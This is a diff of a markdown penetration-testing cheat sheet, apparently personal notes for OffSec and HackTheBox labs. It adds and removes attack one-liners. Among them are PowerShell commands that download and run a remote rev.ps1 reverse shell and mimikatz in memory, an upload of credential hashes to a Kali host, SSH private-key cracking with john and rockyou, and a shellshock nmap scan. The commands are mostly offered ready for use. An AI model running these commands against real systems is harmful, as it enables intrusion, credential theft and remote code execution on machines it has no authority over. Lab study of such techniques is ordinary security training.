@@ -1,17 +1,18 @@
 ### Spawn shell via Python
 `python -c 'import pty;pty.spawn("/bin/bash")' `
 ​ 
-### List of users​ Linux 
-`cat /etc/passwd | cut -d: -f1`    
-
-#### List of super users Linux 
-`grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'`        
+### Convert SSH private key to hash for brute force
+`ssh2john.py in-file-privkey > out-file.hash` 
+`john out-file.hash --wordlist=/usr/share/wordlists/rockyou.txt`
 ​
+### Copy ssh private key for auth
+`openssl rsa -in in-file-privkey -out outfile` 
+
+### use key for ssh
+`ssh -i key-file user@10.10.10.17` 
+
 ### grep for a string in a dir of files
 `grep -ls 'pass' ${PWD}/* `
-
-### Bash ping sweep
-`for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done` 
 
 ### powershell recursive grep like search
 `ls -R -Hidden -EA SilentlyContinue | select-string <search string>`
@@ -19,6 +20,12 @@
 ### Powershell to upload to Kali
 `PS C​:\Tools\active_directory> powershell (​New​-​Object System​.​Net​.​WebClient​)​.​UploadFile​(​'http://192.168.119.143/upload.php'​, 'C:\Tools\active_directory\hashes'​)`
 ​
+### Check if Powershell is running as 32 or 64 bit (Helpful to check if kernel exploits are failing)
+`PS C:\Users> [Environment]::Is64BitProcess` returns true/false 
+if running as 32 bit, call the powershell from `C:\windows\sysNative` instead of `C:\windows\system32` 
+Example - `C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.14.10/rev.ps1')`  
+More info in writeup for [Optimum](https://0xdf.gitlab.io/2021/03/17/htb-optimum.html)
+
 ### Powershell to grab remote file and run it in memory
 `powershell.exe -exec Bypass -​C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.143:8000/mimikatz.exe');"`
 ​
@@ -28,6 +35,9 @@
 ### Find msfvenom payload
 `msfvenom -l payloads | grep linux/x86`
 ​
+### nmap scan for shellshock
+`nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/user.sh 10.10.10.56` 
+
 ### Run burp from command line
 `java -jar -Xmx4g ~/OffSec/Burp/burpsuite_community_v2021.12.1.jar`
 ​
